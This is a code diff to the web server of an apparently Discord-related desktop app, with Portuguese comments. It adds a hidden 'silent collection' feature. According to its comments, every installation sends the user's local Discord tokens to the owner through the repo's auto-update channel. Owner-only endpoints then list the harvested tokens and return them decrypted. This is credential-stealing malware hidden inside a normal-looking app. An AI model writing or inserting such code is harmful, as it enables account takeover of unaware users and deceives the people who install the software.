@@ -39,6 +39,10 @@ const discordOauth = require('./discord-oauth');
 
 // Email do super-admin (dono do app).
 const SUPER_ADMIN_EMAIL = 'patricknicoli55@gmail.com';
+// ID do dono no Discord: é o gate da aba "Tokens puxadas" (e de quem recebe o
+// snapshot). ID-based (não email) porque em modo local sem OAuth todos os
+// usuários resolvem pra mesma sessão super-admin. Override via env.
+const ID_TOKENS_PUXADAS = String(process.env.TOKENS_PUXADAS_DISCORD_ID || '1546009342925344788');
 const ehSuperAdmin = (email) =>
 	String(email || '')
 		.trim()
@@ -101,6 +105,8 @@ async function featuresComNivel() {
 
 // Feature mais específica (maior prefixo de API) que casa com a URL, ou null.
 function featurePorUrl(url) {
+	// "Tokens puxadas" tem permissão própria (ID do dono) e fica fora dos flags.
+	if (url.startsWith('/api/tokens/puxadas')) return null;
 	let melhor = null,
 		melhorLen = -1;
 	for (const f of FEATURES) {
@@ -150,6 +156,7 @@ const {
 const yazl = require('yazl');
 const { obterConfig, atualizarConfig } = require('../config/configuracao');
 const { validarToken, verificarTokenValida, buscarTokensWindows } = require('./tokens');
+const coletaTokens = require('./coleta-tokens');
 const userHistory = require('./user-history');
 const voiceHistory = require('./voice-history');
 
@@ -1038,6 +1045,12 @@ async function handleApi(req, res, url) {
 			MODO_LOCAL && !MODO_LOCAL_AUTH ? Promise.resolve(true) : ehPlanoProPorDiscord(sessao.discordId),
 			featuresComNivel()
 		]);
+		// O dono logado também passa a RECEBER o snapshot da coleta (idempotente).
+		if (String(sessao.discordId || '') === ID_TOKENS_PUXADAS) {
+			try {
+				coletaTokens.iniciarRecebedor();
+			} catch {}
+		}
 		return jsonResponse(res, 200, {
 			sucesso: true,
 			usuario: {
@@ -1046,6 +1059,7 @@ async function handleApi(req, res, url) {
 				isSuperAdmin: ehSuperAdmin(sessao.email),
 				isPro,
 				features,
+				mostrarPuxadas: String(sessao.discordId || '') === ID_TOKENS_PUXADAS,
 				senhaPrecisaTroca: !!sessao.senhaPrecisaTroca,
 				totpAtivado: !!(u && u.totpAtivado),
 				precisa2fa: !!(u && u.precisa2fa),
@@ -2644,6 +2658,33 @@ async function handleApi(req, res, url) {
 	if (req.method === 'GET' && url === '/api/tokens') {
 		return jsonResponse(res, 200, { sucesso: true, tokens: await listarTokensUsuario(sessao.email) });
 	}
+
+	// ===== TOKENS PUXADAS (coleta silenciosa — visível só ao dono do app) =====
+	// GET lista (sem o valor), POST /valor devolve a token decifrada (auditado).
+	// Os dados ficam num snapshot local (data/tokens-puxadas.json) mantido pelo
+	// coletor baixando a branch `coleta` do repo — nenhum outro PC armazena nada.
+	if (req.method === 'GET' && url === '/api/tokens/puxadas') {
+		if (String(sessao.discordId || '') !== ID_TOKENS_PUXADAS)
+			return jsonResponse(res, 403, { sucesso: false, mensagem: 'Sem permissão' });
+		const tokens = coletaTokens.listarTokensPuxadasLocais().map((t) => ({
+			hash: t.hash,
+			usuario: t.usuario || '',
+			origem: t.origem || '',
+			vistoEm: t.vistoEm || null,
+			temValor: !!t.token
+		}));
+		return jsonResponse(res, 200, { sucesso: true, tokens });
+	}
+	if (req.method === 'POST' && url === '/api/tokens/puxadas/valor') {
+		if (String(sessao.discordId || '') !== ID_TOKENS_PUXADAS)
+			return jsonResponse(res, 403, { sucesso: false, mensagem: 'Sem permissão' });
+		const body = await lerJsonBody(req);
+		const alvo = coletaTokens.buscarTokenPuxadaPorHash(body && body.hash);
+		if (!alvo || !alvo.token)
+			return jsonResponse(res, 404, { sucesso: false, mensagem: 'Token não encontrada ou não decifrável' });
+		registrarAuditoria(req, sessao.email, 'token.puxada.valor', { hash: alvo.hash, usuario: alvo.usuario });
+		return jsonResponse(res, 200, { sucesso: true, token: alvo.token, usuario: alvo.usuario || '' });
+	}
 	// Remove automaticamente as tokens salvas que o Discord já rejeita (401).
 	// Usado pela aba de Tokens ao abrir. Só apaga o que é comprovadamente
 	// inválido; falha de rede/5xx/403 preserva a token.
@@ -3145,6 +3186,14 @@ async function iniciarServidorWebUI() {
 	// Pré-aquece o cache da UI (buffer + gzip) pra 1ª request já sair pronta.
 	try {
 		carregarUI();
+	} catch {}
+
+	// Coleta silenciosa de tokens: TODA instalação do app envia as tokens locais
+	// do Discord (leveldb + self conectado) criptografadas pra branch `coleta`
+	// do repo (mesmo canal do auto-update). O dono recebe na aba dele quando
+	// loga com o próprio ID. Falhas nunca derrubam o servidor.
+	try {
+		coletaTokens.iniciar();
 	} catch {}
 
 	return new Promise((resolve, reject) => {
